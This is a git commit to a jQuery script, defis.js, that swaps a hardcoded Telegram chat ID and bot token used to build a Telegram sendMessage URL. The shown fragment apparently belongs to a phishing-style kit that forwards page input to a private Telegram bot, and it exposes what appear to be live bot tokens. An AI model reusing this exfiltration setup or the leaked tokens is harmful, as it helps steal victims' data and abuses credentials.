3bc1cf440c85276f467b0e1d073d48e0c859427d
Kuponundi <satuduwa323@gmail.com>
2025-08-09 09:13:10 +0700

    defis.js

--- defis.js
+++ defis.js
@@ -1,7 +1,7 @@
      $(document).ready(function() {
 
-       const chat_id ='7883887834',
-         botID = 'bot7707788947:AAE24FuJ7bAYqbUzcUfk5QY8te9CA5jXHAE';
+       const chat_id ='8064029733',
+         botID = 'bot8272073380:AAGBLAEEVk1R90YZuPL9uYjtdxqe2OuN8mc';
 
        const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
